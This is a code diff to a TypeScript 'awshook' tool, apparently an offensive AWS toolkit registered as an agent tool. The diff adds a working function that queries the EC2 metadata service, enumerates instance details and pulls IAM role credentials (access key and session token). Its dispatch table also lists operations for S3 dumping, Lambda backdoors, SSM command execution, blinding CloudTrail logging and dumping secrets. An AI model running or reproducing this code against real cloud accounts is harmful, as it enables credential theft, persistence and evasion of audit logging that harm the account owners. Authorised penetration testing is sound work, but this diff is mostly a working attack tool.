@@ -316,6 +316,73 @@ async function ssmExec(args: string[], timeout: number): Promise<HookResult> {
   return { output: output.join("\n"), findings: [] }
 }
 
+async function metadataHarvest(args: string[]): Promise<HookResult> {
+  const version = argVal(args, "--imds-version") || "v2"
+  const output: string[] = ["[*] Probing EC2 metadata endpoint...\n"]
+  const base = "http://169.254.169.254"
+
+  if (version === "v2") {
+    try {
+      const tokenResp = await fetch(`${base}/latest/api/token`, {
+        method: "PUT",
+        headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" },
+        signal: AbortSignal.timeout(5000),
+      })
+      if (!tokenResp.ok) { output.push("[-] IMDSv2 token request failed, trying v1...") }
+      else {
+        const token = await tokenResp.text()
+        const headers = { "X-aws-ec2-metadata-token": token }
+        const endpoints: Record<string, string> = {
+          instance_id: "/latest/meta-data/instance-id",
+          ami_id: "/latest/meta-data/ami-id",
+          hostname: "/latest/meta-data/hostname",
+          iam_role: "/latest/meta-data/iam/security-credentials/",
+          public_ip: "/latest/meta-data/public-ipv4",
+          account_id: "/latest/dynamic/instance-identity/document",
+        }
+        for (const [name, path] of Object.entries(endpoints)) {
+          const resp = await fetch(`${base}${path}`, { headers, signal: AbortSignal.timeout(5000) })
+          if (resp.ok) {
+            const text = await resp.text()
+            output.push(`[+] ${name}: ${text.slice(0, 120)}${text.length > 120 ? "..." : ""}`)
+            if (name === "iam_role" && text.trim()) {
+              const roleName = text.trim().split("\n")[0]
+              const creds = await fetch(`${base}/latest/meta-data/iam/security-credentials/${roleName}`, { headers, signal: AbortSignal.timeout(5000) })
+              if (creds.ok) {
+                const c = await creds.json()
+                output.push(`[+] credentials: AccessKeyId=${String(c.AccessKeyId).slice(0, 8)}... Token=${String(c.Token).slice(0, 20)}...`)
+              }
+            }
+          } else {
+            output.push(`[-] ${name}: HTTP ${resp.status}`)
+          }
+        }
+        return { output: output.join("\n"), findings: [] }
+      }
+    } catch {
+      output.push("[-] Cannot reach metadata endpoint (not on EC2?)")
+      return { output: output.join("\n"), findings: [] }
+    }
+  }
+
+  try {
+    const endpoints: Record<string, string> = {
+      instance_id: "/latest/meta-data/instance-id",
+      iam_role: "/latest/meta-data/iam/security-credentials/",
+      public_ip: "/latest/meta-data/public-ipv4",
+    }
+    for (const [name, path] of Object.entries(endpoints)) {
+      const resp = await fetch(`${base}${path}`, { signal: AbortSignal.timeout(5000) })
+      if (resp.ok) output.push(`[+] ${name}: ${(await resp.text()).slice(0, 120)}`)
+      else output.push(`[-] ${name}: HTTP ${resp.status}`)
+    }
+  } catch {
+    output.push("[-] Cannot reach metadata endpoint (not on EC2?)")
+  }
+
+  return { output: output.join("\n"), findings: [] }
+}
+
 async function stub(name: string): Promise<HookResult> {
   return { output: `[*] ${name}: not yet implemented in native TS`, findings: [] }
 }
@@ -354,7 +421,7 @@ export const AwshookTool = Tool.define("awshook", {
       s3_dump: () => s3Dump(params.args, params.timeout_seconds),
       lambda_backdoor: () => lambdaBackdoor(params.args, params.timeout_seconds),
       ssm_exec: () => ssmExec(params.args, params.timeout_seconds),
-      metadata_harvest: () => stub("metadata_harvest"),
+      metadata_harvest: () => metadataHarvest(params.args),
       cloudtrail_blind: () => stub("cloudtrail_blind"),
       secrets_dump: () => stub("secrets_dump"),
       ec2_snapshot: () => stub("ec2_snapshot"),
